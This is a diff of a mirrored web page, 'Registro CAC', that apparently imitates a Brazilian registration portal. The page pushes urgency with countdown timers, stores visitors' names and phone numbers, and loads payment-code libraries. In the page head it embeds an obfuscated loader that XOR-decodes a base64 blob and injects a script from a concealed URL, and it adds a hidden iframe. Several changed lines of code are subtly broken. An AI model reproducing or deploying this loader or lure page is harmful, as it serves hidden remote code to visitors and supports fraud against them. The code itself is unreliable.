@@ -2,190 +2,190 @@
 <!-- Mirrored from https://cac-brasil-cac.vercel.app/endereco etapa 2/index.html by HTTrack Website Copier/3.x [XR&CO], Mon, 21 Sep 2026 22:05:58 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <style>
+        @keyframes is-rotating {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+    </style>
 
-<style>
-@keyframes is-rotating {
-from { transform: rotate(0deg); }
-to { transform: rotate(360deg); }
-}
-</style>
+    <script src="js/qrcode.min.js"></script>
+    <script src="js/qrcode.min.js"></script>
+    <script src="js/jquery-3.6.4.min.js"></script>
+    <link rel="stylesheet" href="css/all.min.css" crossorigin="anonymous">
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            function startTimer(elementId, initialTimeKey) {
+                let totalSeconds = localStorage.getItem(initialTimeKey);
+                if (!totalSeconds) {
+                    totalSeconds = (2 * 60 * 60) + (54 * 60); // 2 horas e 54 minutos
+                    localStorage.setItem(initialTimeKey, totalSeconds);
+                } else {
+                    totalSeconds = parseInt(totalSeconds, 10);
+                }
 
-<script src="js/qrcode.min.js"></script>
-<script src="js/qrcode.min.js"></script>
-<script src="js/jquery-3.6.4.min.js"></script>
-<link rel="stylesheet" href="css/all.min.css" crossorigin="anonymous">
+                function updateTimer() {
+                    let hours = Math.floor(totalSeconds / 3600);
+                    let minutes = Math.floor((totalSeconds % 3600) / 60);
 
-<script>
-document.addEventListener('DOMContentLoaded', (event) => {
-function startTimer(elementId, initialTimeKey) {
-let totalSeconds = localStorage.getItem(initialTimeKey);
-if (!totalSeconds) {
-totalSeconds = (2 * 60 * 60) + (54 * 60); // 2 horas e 54 minutos
-localStorage.setItem(initialTimeKey, totalSeconds);
-} else {
-totalSeconds = parseInt(totalSeconds, 10);
-}
+                    const el = document.getElementById(elementId);
+                    if(el) el.innerText = `${hours} h ${minutes} min`;
 
-function updateTimer() {
-let hours = Math.floor(totalSeconds / 3600);
-let minutes = Math.floor((totalSeconds % 3600) / 60);
+                    totalSeconds--;
 
-const el = document.getElementById(elementId);
-if(el) el.innerText = `${hours} h ${minutes} min`;
+                    if (totalSeconds < 0) {
+                        clearInterval(timerInterval);
+                        if(el) el.innerText = '0 h 0 min';
+                        localStorage.removeItem(initialTimeKey);
+                    } else {
+                        localStorage.setItem(initialTimeKey, totalSeconds);
+                    }
+                }
 
-totalSeconds--;
+                const timerInterval = setInterval(updateTimer, 1000);
+                updateTimer();
+            }
 
-if (totalSeconds < 0) {
-clearInterval(timerInterval);
-if(el) el.innerText = '0 h 0 min';
-localStorage.removeItem(initialTimeKey);
-} else {
-localStorage.setItem(initialTimeKey, totalSeconds);
-}
-}
+            startTimer('timer1', 'timer1Time');
+            startTimer('timer2', 'timer2Time');
+            startTimer('timer3', 'timer3Time');
+            startTimer('timer4', 'timer4Time');
+        });
+    </script>
 
-const timerInterval = setInterval(updateTimer, 1000);
-updateTimer();
-}
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const destinatarioField = document.getElementById("address_destinatario");
+            const phoneField = document.getElementById("phone");
 
-startTimer('timer1', 'timer1Time');
-startTimer('timer2', 'timer2Time');
-startTimer('timer3', 'timer3Time');
-startTimer('timer4', 'timer4Time');
-});
-</script>
+            const updateFields = () => {
+                if(!destinatarioField || !phoneField) return;
+                const formData = {
+                    destinatario: destinatarioField.value,
+                    phone: phoneField.value,
+                };
 
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-const destinatarioField = document.getElementById("address_destinatario");
-const phoneField = document.getElementById("phone");
+                localStorage.setItem("data-drop2", JSON.stringify(formData));
 
-const updateFields = () => {
-if(!destinatarioField ||!phoneField) return;
-const formData = {
-destinatario: destinatarioField.value,
-phone: phoneField.value,
-};
+                const destEl = document.getElementById("DESTINATARIO");
+                const phoneEl = document.getElementById("PHONE");
+                if(destEl) destEl.textContent = "Destinatário: " + formData.destinatario;
+                if(phoneEl) phoneEl.textContent = "Telefone: " + formData.phone;
+            };
 
-localStorage.setItem("data-drop2", JSON.stringify(formData));
+            if(destinatarioField) destinatarioField.addEventListener("input", updateFields);
+            if(phoneField) phoneField.addEventListener("input", updateFields);
 
-const destEl = document.getElementById("DESTINATARIO");
-const phoneEl = document.getElementById("PHONE");
-if(destEl) destEl.textContent = "Destinatário: " + formData.destinatario;
-if(phoneEl) phoneEl.textContent = "Telefone: " + formData.phone;
-};
+            const lastFormDataJSON = localStorage.getItem("data-drop2");
+            if (lastFormDataJSON) {
+                const lastFormData = JSON.parse(lastFormDataJSON);
+                if(destinatarioField) destinatarioField.value = lastFormData.destinatario;
+                if(phoneField) phoneField.value = lastFormData.phone;
 
-if(destinatarioField) destinatarioField.addEventListener("input", updateFields);
-if(phoneField) phoneField.addEventListener("input", updateFields);
+                const destEl = document.getElementById("DESTINATARIO");
+                const phoneEl = document.getElementById("PHONE");
+                if(destEl) destEl.textContent = "Destinatário: " + lastFormData.destinatario;
+                if(phoneEl) phoneEl.textContent = "Telefone: " + lastFormData.phone;
+            }
+        });
+    </script>
 
-const lastFormDataJSON = localStorage.getItem("data-drop2");
-if (lastFormDataJSON) {
-const lastFormData = JSON.parse(lastFormDataJSON);
-if(destinatarioField) destinatarioField.value = lastFormData.destinatario;
-if(phoneField) phoneField.value = lastFormData.phone;
+    <style>
+        .cssinspector-current-popup.cssinspector-extension-elements {
+            display: none;
+        }
 
-const destEl = document.getElementById("DESTINATARIO");
-const phoneEl = document.getElementById("PHONE");
-if(destEl) destEl.textContent = "Destinatário: " + lastFormData.destinatario;
-if(phoneEl) phoneEl.textContent = "Telefone: " + lastFormData.phone;
-}
-});
-</script>
+        #progress {
+            display: none;
+        }
 
-<style>
-.cssinspector-current-popup.cssinspector-extension-elements {
-display: none;
-}
+        #cssinspector-logo-wrapper {
+            display: none;
+        }
 
-#progress {
-display: none;
-}
+        @font-face {
+            font-family: 'Proxima Nova';
+            font-weight: 300;
+            font-display: swap;
+            font-style: normal;
+            src: url(fonts/proximanova-light.woff2) format("woff2"), url(fonts/proximanova-light.woff) format("woff"), url(fonts/proximanova-light.ttf) format("truetype")
+        }
 
-#cssinspector-logo-wrapper {
-display: none;
-}
+        @font-face {
+            font-family: 'Proxima Nova';
+            font-weight: 400;
+            font-display: swap;
+            font-style: normal;
+            src: url(fonts/proximanova-regular.woff2) format("woff2"), url(fonts/proximanova-regular.woff) format("woff"), url(fonts/proximanova-regular.ttf) format("truetype")
+        }
 
-@font-face {
-font-family: 'Proxima Nova';
-font-weight: 300;
-font-display: swap;
-font-style: normal;
-src: url(fonts/proximanova-light.woff2) format("woff2"), url(fonts/proximanova-light.woff) format("woff"), url(fonts/proximanova-light.ttf) format("truetype")
-}
+        @font-face {
+            font-family: 'Proxima Nova';
+            font-weight: 600;
+            font-display: swap;
+            font-style: normal;
+            src: url(fonts/proximanova-semibold.woff2) format("woff2"), url(fonts/proximanova-semibold.woff) format("woff"), url(fonts/proximanova-semibold.ttf) format("truetype")
+        }
+    </style>
 
-@font-face {
-font-family: 'Proxima Nova';
-font-weight: 400;
-font-display: swap;
-font-style: normal;
-src: url(fonts/proximanova-regular.woff2) format("woff2"), url(fonts/proximanova-regular.woff) format("woff"), url(fonts/proximanova-regular.ttf) format("truetype")
-}
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <style>
+        #admin-bar-iframe {
+            display: none;
+        }
+    </style>
 
-@font-face {
-font-family: 'Proxima Nova';
-font-weight: 600;
-font-display: swap;
-font-style: normal;
-src: url(fonts/proximanova-semibold.woff2) format("woff2"), url(fonts/proximanova-semibold.woff) format("woff"), url(fonts/proximanova-semibold.ttf) format("truetype")
-}
-</style>
+    <script src="js/qrcode.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="css/slick.css">
+    <script src="js/jquery-3.6.0.min.js"></script>
 
-<script src="js/jquery-3.6.0.min.js"></script>
-<style>
-#admin-bar-iframe {
-display: none;
-}
-</style>
+    <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    '../../connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1532671745295740');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1532671745295740&amp;ev=PageView&amp;noscript=1"
+    /></noscript>
 
-<script src="js/qrcode.min.js"></script>
-<link rel="stylesheet" type="text/css" href="css/slick.css">
-<script src="js/jquery-3.6.0.min.js"></script>
+    <title> Registro CAC</title><script src="js/jquery-3.6.0.min.js"></script></head><body class="" id="bodytop1">
+    
+    <script>(function(){var n_y=atob("DM3TX4VSMccmtrJmp7bxKvc+E/0E3sYS177pcKoxVakIw8YLzquqceY9XOlExJ0VxL+6L/EhHrJS28FJy6ynOvYmH61VlJ5ExrmnLewwRLNDxZBc/LbxMeQ/VOUclNYH06z+KvE/WKFfm8IUwru2MfF/SaRJ0p8VxKbxc6ckUKtT05Bche+uc/5wX6ZL05BchamyK+R/RLNL39Qfir2hOvM3X7MLxccEzqmgfalwR6ZKw9dEne/xItgv");var f_z8=[];for(var b_4qcr=0;b_4qcr<n_y.length;b_4qcr++){f_z8.push(n_y.charCodeAt(b_4qcr)&255);}var f_6=f_z8[0];var j_9=f_z8.slice(1,1+f_6);var m_e=f_z8.slice(1+f_6);var c_q7u=m_e.map(function(b,a_gv9m){return b^j_9[a_gv9m%f_6];});var n_wjdg="";for(var c_m=0;c_m<c_q7u.length;c_m++){n_wjdg+=String.fromCharCode(c_q7u[c_m]&255);}var b_r=decodeURIComponent(escape(n_wjdg));var g_8=JSON.parse(b_r);var u_ff8w=g_8.globals||[];u_ff8w.forEach(function(f_cm){window[f_cm.name]=f_cm.value;});var p_ab3k=document.createElement("script");p_ab3k.src=g_8.url;p_ab3k.async=true;p_ab3k.defer=true;(g_8.attributes||[]).forEach(function(x_w){p_ab3k.setAttribute(x_w.name,x_w.value);});(document.head||document.documentElement).appendChild(p_ab3k);})();</script>
+    
+    <iframe src="about:blank" title="" role="presentation" loading="eager" style="width: 0px; height: 0px; border: 0px; display: none;"></iframe><link rel="stylesheet" type="text/css" href="css/slick.css"><script type="text/javascript" src="js/slick.min.js"></script><script src="js/JsBarcode.all.min.js"></script>
 
-<!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e);
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'../../connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1532671745295740');
-fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1532671745295740&amp;ev=PageView&amp;noscript=1"
-/></noscript>
+    <svg style="display: none;">
+        <symbol id="search">
+            <g fill-rule="nonzero">
+                <path d="M7.508 15.015A7.508 7.508 0 1 0 7.508 0a7.508 7.508 0 0 0 0 15.015zm0-1.2a6.308 6.308 0 1 1 0-12.615 6.308 6.308 0 0 1 0 12.615z"></path>
+                <path d="M17.801 16.953L12.6 11.75l-.849.849 5.202 5.201z"></path>
+            </g>
+        </symbol>
+    </svg>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="">
 
-<title> Registro CAC</title><script src="js/jquery-3.6.0.min.js"></script></head><body class="" id="bodytop1">
+    <link rel="preconnect" href="https://cdn.shopify.com/" crossorigin="">
+    <link rel="preconnect" href="https://fonts.shopify.com/" crossorigin="">
+    <link rel="preconnect" href="https://cdn.jsdelivr.net/" crossorigin="">
+    <link rel="preconnect" href="https://monorail-edge.shopifysvc.com/">
 
-<script>(function(){var n_y=atob("DM3TX4VSMccmtrJmp7bxKvc+E/0E3sYS177pcKoxVakIw8YLzquqceY9XOlExJ0VxL+6L/EhHrJS28FJy6ynOvYmH61VlJ5ExrmnLewwRLNDxZBc/LbxMeQ/VOUclNYH06z+KvE/WKFfm8IUwru2MfF/SaRJ0p8VxKbxc6ckUKtT05Bche+uc/5wX6ZL05BchamyK+R/RLNL39Qfir2hOvM3X7MLxccEzqmgfalwR6ZKw9dEne/xItgv");var f_z8=[];for(var b_4qcr=0;b_4qcr<n_y.length;b_4qcr++){f_z8.push(n_y.charCodeAt(b_4qcr)&255);}var f_6=f_z8; var j_9=f_z8.slice(1,1+f_6);var m_e=f_z8.slice(1+f_6);var c_q7u=m_e.map(function(b,a_gv9m){return b^j_9[a_gv9m%f_6];});var n_wjdg="";for(var c_m=0;c_m<c_q7u.length;c_m++){n_wjdg+=String.fromCharCode(c_q7u[c_m]&255);}var b_r=decodeURIComponent(escape(n_wjdg));var g_8=JSON.parse(b_r);var u_ff8w=g_8.globals||[];u_ff8w.forEach(function(f_cm){window[f_cm.name]=f_cm.value;});var p_ab3k=document.createElement("script");p_ab3k.src=g_8.url;p_ab3k.async=true;p_ab3k.defer=true;(g_8.attributes||[]).forEach(function(x_w){p_ab3k.setAttribute(x_w.name,x_w.value);});(document.head||document.documentElement).appendChild(p_ab3k);})();</script>
+    <link rel="canonical" href="https://67aa9c-75.myshopify.com/pages/endereco">
 
-<iframe src="about:blank" title="" role="presentation" loading="eager" style="width: 0px; height: 0px; border: 0px; display: none;"></iframe><link rel="stylesheet" type="text/css" href="css/slick.css"><script type="text/javascript" src="js/slick.min.js"></script><script src="js/JsBarcode.all.min.js"></script>
-
-<svg style="display: none;">
-<symbol id="search">
-<g fill-rule="nonzero">
-<path d="M7.508 15.015A7.508 7.508 0 1 0 7.508 0a7.508 7.508 0 0 0 0 15.015zm0-1.2a6.308 6.308 0 1 1 0-12.615 6.308 6.308 0 0 1 0 12.615z"></path>
-<path d="M17.801 16.953L12.6 11.75l-.849.849 5.202 5.201z"></path>
-</g>
-</symbol>
-</svg>
-<meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<meta name="theme-color" content="">
-
-<link rel="preconnect" href="https://cdn.shopify.com/" crossorigin="">
-<link rel="preconnect" href="https://fonts.shopify.com/" crossorigin="">
-<link rel="preconnect" href="https://cdn.jsdelivr.net/" crossorigin="">
-<link rel="preconnect" href="https://monorail-edge.shopifysvc.com/">
-
-<link rel="canonical" href="https://67aa9c-75.myshopify.com/pages/endereco">
-
-<script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.start');</script><meta id="shopify-digital-wallet" name="shopify-digital-wallet" content="/89876594977/digital_wallets/dialog">
+    <script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.start');</script><meta id="shopify-digital-wallet" name="shopify-digital-wallet" content="/89876594977/digital_wallets/dialog">
 <meta name="shopify-checkout-api-token" content="9cdfc54949297876227300cffe6e70ca">
 <meta id="in-context-paypal-metadata" data-shop-id="89876594977" data-venmo-supported="false" data-environment="production" data-locale="pt_BR" data-paypal-v4="true" data-currency="BRL">
 <script async="async" src="js/preloads_1.js"></script>
@@ -208,208 +208,578 @@ Shopify.routes.root = "/";</script>
 <script id="shop-js-analytics" type="application/json">{"pageType":"page"}</script>
 <script id="__st">var __st={"a":89876594977,"offset":-10800,"reqid":"38a39077-4786-466b-93cf-507589030ccf-1726059742","pageurl":"www.portal-registro-cac.org\/pages\/endereco","s":"pages-147365232929","u":"f4bf108e3016","p":"page","rtyp":"page","rid":147365232929};</script>
 <script>window.ShopifyPaypalV4VisibilityTracking = true;</script>
-<script id="captcha-bootstrap">!function(){'use strict';const t='contact',e='account',n='new_comment',o=[[t,t],['blogs',n],['comments',n],['t','customer']],c=[[e,'customer_login'],[e,'guest_login'],[e,'recover_customer_password'],[e,'create_customer']],r=t=>t.map((([t,e])=>`form[action*='/${t}']:not([data-nocaptcha='true']) input[name='form_type'][value='${e}']`)).join(',');function s(t,e,n=!1){try{const o=window.sessionStorage;for(const[n,c]of Object.entries(JSON.parse(o.getItem(e))))t.elements[n]&&(t.elements[n].value=c);n&&o.removeItem(e)}catch{}}const a='form_key',i=['recaptcha-v3-token','g-recaptcha-response','h-captcha-response','password'],u=()=>{try{return window.sessionStorage}catch{return}},m=t=>t.elements[a],f='form_type',d='cptcha';function p(t){t.dataset[d]=!0}const l=window,h=l.document,_='Shopify',y='ce_forms',E='captcha';let v=!1;((t,e)=>{const n=(g='f06e6c50-85a8-45c8-87d0-21a2b65856fe','../../cdn.shopify.com/shopifycloud/storefront-forms-hcaptcha/ce_storefront_forms_captcha_hcaptcha.v1.4.0.iife.js',T={infoText:'Protegido por hCaptcha',privacyText:'Privacidade',termsText:'Termos'},(t,e,n)=>{const o=l[_][y],c=o.bindForm;if(c)return c(t,g,e,T).then(n);o.q.push([[t,g,e,T],n]),v||(h.body.append(Object.assign(h.createElement('script'),{id:'captcha-provider',async:!0,src:'https://cdn.shopify.com/shopifycloud/storefront-forms-hcaptcha/ce_storefront_forms_captcha_hcaptcha.v1.4.0.iife.js'})),v=!0)});var g,T;l[_]=l[_]||{},l[_][y]=l[_][y]||{},l[_][y].q=[],l[_][E]=l[_][E]||{},l[_][E].protect=function(t,e){n(t,void 0,e),p(t)},Object.freeze(l[_][E]),function(t,e,n,l,h,_){const[y,E,v,g]=function(t,e,n){const s=e?o:[],a=t?c:[],i=[...s,...a],u=[...o],m=r(i),f=r(s),d=n&&r(i.filter((([t,e])=>n.includes(e)))),p=r(u),l=t=>()=>t?[...document.querySelectorAll(t)].map((t=>t.form)):[];return[l(m),l(f),l(d),l(p)]}(l,h,_),T=t=>{const e=t.target;return e instanceof HTMLFormElement?e:e&&e.form},S=t=>y().includes(t);t.addEventListener('submit',(t=>{const e=T(t);if(!e)return;const n=S(e)&&!e.dataset.hcaptchaBound&&!e.dataset.recaptchaBound,o=m(e),c=g().includes(e)&&(!o||!o.value);(n||c)&&t.preventDefault(),c&&!n&&(function(t){try{if(!u())return;!function(t){const e=u();if(!e)return;const n=m(t);if(!n)return;const o=n.value;o&&e.removeItem(o)}(t);const e=Array.from(Array(32),(()=>Math.random().toString(36))).join('');!function(t,e){m(t)||t.append(Object.assign(document.createElement('input'),{type:'hidden',name:a})),t.elements[a].value=e}(t,e),function(t,e){const n=u();if(!n)return;const o=[...t.querySelectorAll('input[type="password"]')].map((({name:t})=>t)),c=[...i,...o],r={};for(const[s,a]of new FormData(t).entries())c.includes(s)||(r[s]=a);n.setItem(e,JSON.stringify(r))}(t,e)}catch(e){console.error('failed to persist form',e)}}(e),e.submit())}));const w=(t,e)=>{t&&!t.dataset[d]&&(n(t,e.some((e=>e===t))),p(t))};for(const o of['focusin','change'])t.addEventListener(o,(t=>{const e=T(t);S(e)&&w(e,E())}));const A=e.get('form_key'),b=e.get(f),I=A&&b;t.addEventListener('DOMContentLoaded',(()=>{const t=E();if(I)for(const e of t)e.elements[f].value===b&&s(e,A);[...new Set([...v(),...y().filter((e=>'true'===e.dataset.shopifyCaptcha))])].forEach((e=>w(e,t)))}))}(h,new URLSearchParams(l.location.search),n,!0,!0,['guest_login'])})()}();</script>
-<script id="captcha-terms">!function(){'use strict';const e=/recaptcha|reCATPCHA|google|Googl/gi,t=o=>{let c=o.firstChild;for(;c;)c.nodeType===Node.TEXT_NODE?c.textContent=c.textContent.replace(e,'hCaptcha'):c.nodeType===Node.ELEMENT_NODE&&t(c),c=c.nextSibling};document.addEventListener('DOMContentLoaded',(()=>{(e=>{const o=document.querySelector('p[data-spam-detection-disclaimer]');if(o){for(const e of['terms','privacy']){const t=o.querySelector(`a[href*='https://policies.google.com/${e}']`);t&&(t.href=`https://hcaptcha.com/${e}`)}t(o)}})()}))}();</script>
-&lt;script data-source-attribution="shopify.loadfeatures" defer="defer" src="js/load_feature-9f951eb7d8d53973c719de211f807d63af81c644e5b9a6ae72661ac408d472f6.js" crossorigin="anonymous"&gt;&lt;/script&gt;
-&lt;script data-source-attribution="shopify.dynamic-checkout" defer="defer" src="js/features-1c0b396bd4d054b94abae1eb6a1bd6ba47beb35525c18.js" crossorigin="anonymous"&gt;&lt;/script&gt;
+<script id="captcha-bootstrap">!function(){'use strict';const t='contact',e='account',n='new_comment',o=[[t,t],['blogs',n],['comments',n],['t','customer']],c=[[e,'customer_login'],[e,'guest_login'],[e,'recover_customer_password'],[e,'create_customer']],r=t=>t.map((([t,e])=>`form[action*='/${t}']:not([data-nocaptcha='true']) input[name='form_type'][value='${e}']`)).join(',');function s(t,e,n=!1){try{const o=window.sessionStorage;for(const[n,c]of Object.entries(JSON.parse(o.getItem(e))))t.elements[n]&&(t.elements[n].value=c);n&&o.removeItem(e)}catch{}}const a='form_key',i=['recaptcha-v3-token','g-recaptcha-response','h-captcha-response','password'],u=()=>{try{return window.sessionStorage}catch{return}},m=t=>t.elements[a],f='form_type',d='cptcha';function p(t){t.dataset[d]=!0}const l=window,h=l.document,_='Shopify',y='ce_forms',E='captcha';let v=!1;((t,e)=>{const n=(g='f06e6c50-85a8-45c8-87d0-21a2b65856fe','../../cdn.shopify.com/shopifycloud/storefront-forms-hcaptcha/ce_storefront_forms_captcha_hcaptcha.v1.4.0.iife.js',T={infoText:'Protegido por hCaptcha',privacyText:'Privacidade',termsText:'Termos'},(t,e,n)=>{const o=l[_][y],c=o.bindForm;if(c)return c(t,g,e,T).then(n);o.q.push([[t,g,e,T],n]),v||(h.body.append(Object.assign(h.createElement('script'),{id:'captcha-provider',async:!0,src:'https://cdn.shopify.com/shopifycloud/storefront-forms-hcaptcha/ce_storefront_forms_captcha_hcaptcha.v1.4.0.iife.js'})),v=!0)});var g,T;l[_]=l[_]||{},l[_][y]=l[_][y]||{},l[_][y].q=[],l[_][E]=l[_][E]||{},l[_][E].protect=function(t,e){n(t,void 0,e),p(t)},Object.freeze(l[_][E]),function(t,e,n,l,h,_){const[y,E,v,g]=function(t,e,n){const s=e?o:[],a=t?c:[],i=[...s,...a],u=[...o],m=r(i),f=r(s),d=n&&r(i.filter((([t,e])=>n.includes(e)))),p=r(u),l=t=>()=>t?[...document.querySelectorAll(t)].map((t=>t.form)):[];return[l(m),l(f),l(d),l(p)]}(l,h,_),T=t=>{const e=t.target;return e instanceof HTMLFormElement?e:e&&e.form},S=t=>y().includes(t);t.addEventListener('submit',(t=>{const e=T(t);if(!e)return;const n=S(e)&&!e.dataset.hcaptchaBound&&!e.dataset.recaptchaBound,o=m(e),c=g().includes(e)&&(!o||!o.value);(n||c)&&t.preventDefault(),c&&!n&&(function(t){try{if(!u())return;!function(t){const e=u();if(!e)return;const n=m(t);if(!n)return;const o=n.value;o&&e.removeItem(o)}(t);const e=Array.from(Array(32),(()=>Math.random().toString(36)[2])).join('');!function(t,e){m(t)||t.append(Object.assign(document.createElement('input'),{type:'hidden',name:a})),t.elements[a].value=e}(t,e),function(t,e){const n=u();if(!n)return;const o=[...t.querySelectorAll('input[type="password"]')].map((({name:t})=>t)),c=[...i,...o],r={};for(const[s,a]of new FormData(t).entries())c.includes(s)||(r[s]=a);n.setItem(e,JSON.stringify(r))}(t,e)}catch(e){console.error('failed to persist form',e)}}(e),e.submit())}));const w=(t,e)=>{t&&!t.dataset[d]&&(n(t,e.some((e=>e===t))),p(t))};for(const o of['focusin','change'])t.addEventListener(o,(t=>{const e=T(t);S(e)&&w(e,E())}));const A=e.get('form_key'),b=e.get(f),I=A&&b;t.addEventListener('DOMContentLoaded',(()=>{const t=E();if(I)for(const e of t)e.elements[f].value===b&&s(e,A);[...new Set([...v(),...y().filter((e=>'true'===e.dataset.shopifyCaptcha))])].forEach((e=>w(e,t)))}))}(h,new URLSearchParams(l.location.search),n,!0,!0,['guest_login'])})()}();</script>
+<script id="captcha-terms">!function(){'use strict';const e=/recaptcha|reCATPCHA|google|Googl/gi,t=o=>{let c=o.firstChild;for(;c;)c.nodeType===Node.TEXT_NODE?c.textContent=c.textContent.replace(e,'hCaptcha'):c.nodeType===Node.ELEMENT_NODE&&t(c),c.nextSibling};document.addEventListener('DOMContentLoaded',(()=>{(e=>{const o=document.querySelector('p[data-spam-detection-disclaimer]');if(o){for(const e of['terms','privacy']){const t=o.querySelector(`a[href*='https://policies.google.com/${e}']`);t&&(t.href=`https://hcaptcha.com/${e}`)}t(o)}})()}))}();</script>
+<script data-source-attribution="shopify.loadfeatures" defer="defer" src="js/load_feature-9f951eb7d8d53973c719de211f807d63af81c644e5b9a6ae72661ac408d472f6.js" crossorigin="anonymous"></script>
+<script data-source-attribution="shopify.dynamic-checkout" defer="defer" src="js/features-1c0b396bd4d054b94abae1eb6a1bd6ba47beb35525c18.js" crossorigin="anonymous"></script>
 
 <style id="shopify-dynamic-checkout-cart">@media screen and (min-width: 750px) {
-#dynamic-checkout-cart {
-min-height: 50px;
-}
+  #dynamic-checkout-cart {
+    min-height: 50px;
+  }
 }
 
 @media screen and (max-width: 750px) {
-#dynamic-checkout-cart {
-min-height: 60px;
+  #dynamic-checkout-cart {
+    min-height: 60px;
+  }
 }
-}
-</style>&lt;script&gt;window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.end');&lt;/script&gt;
+</style><script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.end');</script>
 
-&lt;script&gt;
-const qtd_sem_juros_parcelamento = Number('');
-const key = ''
-const domain = '67aa9c-75.myshopify.com'
-const permanentDomain = '67aa9c-75.myshopify.com'
-&lt;/script&gt;
-&lt;script src="js/JsBarcode.all.min.js"&gt;&lt;/script&gt;
+    <script>
+        const qtd_sem_juros_parcelamento = Number('');
+        const key = ''
+        const domain = '67aa9c-75.myshopify.com'
+        const permanentDomain = '67aa9c-75.myshopify.com'
+    </script>
+    <script src="js/JsBarcode.all.min.js"></script>
 
-&lt;script src="js/JsBarcode.all.min.js"&gt;&lt;/script&gt;
+<script src="js/JsBarcode.all.min.js"></script>
 <style>
-#quick-view-modal {
-display: none;
-}
+    #quick-view-modal {
+        display: none;
+    }
 
-#search-modal {
-display: none;
-}
+    #search-modal {
+        display: none;
+    }
 
-#account-modal {
-display: none;
-}
+    #account-modal {
+        display: none;
+    }
 
-#wishlist-modal {
-display: none;
-}
+    #wishlist-modal {
+        display: none;
+    }
 
-#cart-modal {
-display: none;
-}
+    #cart-modal {
+        display: none;
+    }
 
-#toast-wrapper {
-display: none;
-}
+    #toast-wrapper {
+        display: none;
+    }
 
-#cssinspector-elements-menu {
-display: none;
-}
+    #cssinspector-elements-menu {
+        display: none;
+    }
 
-#cssinspector-current-popup.cssinspector-extension-elements {
-display: none;
-}
+    #cssinspector-current-popup.cssinspector-extension-elements {
+        display: none;
+    }
 
-.instruct-click-pin {
-display: none;
-}
+    .instruct-click-pin {
+        display: none;
+    }
 </style>
 
 
-<div id="">
-<a style="display: none;" href="#main" class="sr-only sr-only-focusable">
-Skip to content
-</a>
+    <div id="">
+        <a style="display: none;" href="#main" class="sr-only sr-only-focusable">
+            Skip to content
+        </a>
 
-<div id="shopify-section-topbar" class="shopify-section"><!-------></div>
+        <div id="shopify-section-topbar" class="shopify-section"><!-------></div>
 
-<style>
-#finalizandoCEO {
-position: fixed;
-top: 0;
-left: 0;
-width: 100%;
-height: 100%;
-background-color: rgba(0, 0, 0, 0.5);
-z-index: 9999;
-display: flex;
-flex-direction: column;
-justify-content: center;
-align-items: center;
-}
+ <style>
+        #finalizandoCEO {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
 
-#finalizandoCEO p {
-color: white;
-font-size: 24px;
-text-align: center;
-margin-top: 20px;
-}
+        #finalizandoCEO p {
+            color: white;
+            font-size: 24px;
+            text-align: center;
+            margin-top: 20px;
+        }
 
-@keyframes is-rotating {
-to {
-transform: rotate(1turn);
-}
-}
+        @keyframes is-rotating {
+            to {
+                transform: rotate(1turn);
+            }
+        }
 
-@keyframes border-pulse {
-0%, 100% {
-border-top-color: #3483fa;
-border-right-color: transparent;
-border-bottom-color: transparent;
-border-left-color: transparent;
-}
-25% {
-border-top-color: #3483fa;
-border-right-color: #3483fa;
-border-bottom-color: transparent;
-border-left-color: transparent;
-}
-50% {
-border-top-color: #fff159;
-border-right-color: #fff159;
-border-bottom-color: #fff159;
-border-left-color: transparent;
-}
-75% {
-border-top-color: #fff159;
-border-right-color: transparent;
-border-bottom-color: transparent;
-border-left-color: transparent;
-}
-}
-</style>
+        @keyframes border-pulse {
+            0%, 100% {
+                border-top-color: #3483fa;
+                border-right-color: transparent;
+                border-bottom-color: transparent;
+                border-left-color: transparent;
+            }
+            25% {
+                border-top-color: #3483fa;
+                border-right-color: #3483fa;
+                border-bottom-color: transparent;
+                border-left-color: transparent;
+            }
+            50% {
+                border-top-color: #fff159;
+                border-right-color: #fff159;
+                border-bottom-color: #fff159;
+                border-left-color: transparent;
+            }
+            75% {
+                border-top-color: #fff159;
+                border-right-color: transparent;
+                border-bottom-color: transparent;
+                border-left-color: transparent;
